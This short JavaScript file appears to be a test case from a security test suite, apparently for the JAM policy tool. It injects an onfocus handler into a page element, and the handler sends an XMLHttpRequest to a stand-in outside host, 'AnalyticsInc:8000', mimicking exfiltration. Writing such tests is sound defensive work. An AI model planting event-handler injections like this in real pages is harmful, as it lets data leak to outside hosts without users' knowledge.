// exfil_test_onfocus1.js
var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=onfocus1", true);xmlhttp.send(null);';
var v0 = document.getElementById("test");
JAM.call(v0.setAttribute, v0, ["onfocus", exp])

